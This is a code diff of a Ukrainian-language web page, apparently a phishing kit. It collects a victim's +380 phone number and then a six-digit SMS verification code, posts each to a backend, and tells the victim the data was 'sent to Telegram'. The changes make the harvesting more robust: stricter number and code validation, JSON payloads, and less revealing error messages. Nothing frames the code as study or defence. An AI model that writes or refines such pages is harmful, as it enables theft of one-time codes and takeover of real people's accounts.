@@ -11,6 +11,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 
     <style>
+        /* CSS залишається незмінним, він коректний */
         :root {
             --primary-color: #ff3b30; /* Червоний колір кнопки */
             --primary-hover-color: #e5332a;
@@ -198,6 +199,7 @@
         $(document).ready(function(){
             const prefix = '+380 ';
             
+            // Встановлюємо маску для номера телефону
             $('#phone-number').mask(
                 '+380 99 99 999 99', 
                 {
@@ -212,7 +214,8 @@
                     $(this).val(prefix);
                 }
             }).on('keydown', function(e) {
-                if (e.keyCode === 8 && $(this).val() === prefix) { // 8 - Backspace
+                // Заборона Backspace/Delete, якщо залишився тільки префікс
+                if ((e.keyCode === 8 || e.keyCode === 46) && $(this).val() === prefix) { 
                     e.preventDefault();
                 }
             });
@@ -243,18 +246,18 @@
         // === ЛОГІКА ДЛЯ ПЕРЕМИКАННЯ ТА ВІДПРАВКИ КРОКІВ (AJAX) ===
         function showSmsStep() {
             const phoneNumber = $('#phone-number').val();
-            
-            // Перевірка на валідність номеру
-            if (phoneNumber && phoneNumber.length === '+380 99 99 999 99'.length) {
+            // Перевірка на валідність номеру (повна довжина без пробілів)
+            if (phoneNumber && phoneNumber.replace(/\s/g, '').length === '+380999999999'.length) {
                 
                 // 1. ВІДПРАВКА НОМЕРУ ТЕЛЕФОНУ
                 $.ajax({
-                    url: '/api/send-data', // <== Шлях до Node.js server.js
+                    url: '/api/send-data', 
                     type: 'POST',
-                    data: {
+                    contentType: 'application/json', // Важливо для Node.js сервера
+                    data: JSON.stringify({ // Відправляємо JSON
                         step: 'phone',
                         phone: phoneNumber
-                    },
+                    }),
                     success: function(response) {
                         // Якщо відправка пройшла успішно, переходимо до кроку SMS
                         $('#phone-step').hide();
@@ -263,12 +266,13 @@
                         console.log('Номер телефону успішно відправлено:', response);
                     },
                     error: function(xhr, status, error) {
-                        alert('Помилка відправки номеру. Перевірте роботу server.js: ' + error);
+                        alert('Помилка відправки номеру. Перевірте роботу сервера.');
+                        console.error('Помилка AJAX (Телефон):', xhr.responseText);
                     }
                 });
                 
             } else {
-                alert('Будь ласка, введіть повний номер телефону.');
+                alert('Будь ласка, введіть повний номер телефону у форматі +380 ХХ ХХ ХХХ ХХ.');
             }
         }
 
@@ -276,32 +280,31 @@
         function sendSmsCode(event) {
             event.preventDefault(); 
 
-            const code1 = $('#code-1').val();
-            const code2 = $('#code-2').val();
-            const code3 = $('#code-3').val();
-            const code4 = $('#code-4').val();
-            const code5 = $('#code-5').val();
-            const code6 = $('#code-6').val();
+            // Збираємо код з усіх полів
+            const smsCode = $('.code-input').map(function() {
+                return this.value;
+            }).get().join(''); 
             
-            const smsCode = code1 + code2 + code3 + code4 + code5 + code6;
-            
-            if (smsCode.length === 6) {
+            // Перевірка на 6 цифр
+            if (smsCode.length === 6 && /^\d+$/.test(smsCode)) { 
                 
                 // 2. ВІДПРАВКА SMS-КОДУ
                 $.ajax({
-                    url: '/api/send-data', // <== Шлях до Node.js server.js
+                    url: '/api/send-data', 
                     type: 'POST',
-                    data: {
+                    contentType: 'application/json', // Важливо для Node.js сервера
+                    data: JSON.stringify({ // Відправляємо JSON
                         step: 'code',
                         code: smsCode
-                    },
+                    }),
                     success: function(response) {
                         alert('Код підтверджено! Дані відправлені у Telegram.');
                         console.log('SMS-код успішно відправлено:', response);
                         // Тут можна перенаправити користувача або показати повідомлення про успіх
                     },
                     error: function(xhr, status, error) {
-                        alert('Помилка відправки коду. Перевірте роботу server.js: ' + error);
+                        alert('Помилка відправки коду. Перевірте роботу сервера.');
+                        console.error('Помилка AJAX (Код):', xhr.responseText);
                     }
                 });
                 
